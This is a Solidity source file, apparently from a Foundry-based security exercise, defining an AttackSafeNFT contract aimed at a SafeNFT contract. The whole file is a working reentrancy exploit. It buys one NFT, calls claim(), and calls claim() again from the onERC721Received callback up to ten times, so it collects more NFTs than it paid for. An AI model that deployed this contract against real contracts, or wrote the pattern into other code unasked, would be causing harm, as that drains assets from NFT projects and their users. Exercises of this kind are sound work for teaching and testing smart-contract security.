// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {SafeNFT} from "../src/SafeNFT.sol";
import {Test, console} from "forge-std/Test.sol";

contract AttackSafeNFT is IERC721Receiver {
    address public owner;
    SafeNFT public safenft;
    uint256 public counter;

    constructor(address _contractAddress) {
        owner = msg.sender;
        safenft = SafeNFT(_contractAddress);
    }

    function attack(uint256 amount) external {
        safenft.buyNFT{value: amount}();
        safenft.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if (counter < 10) {
            counter++;
            safenft.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
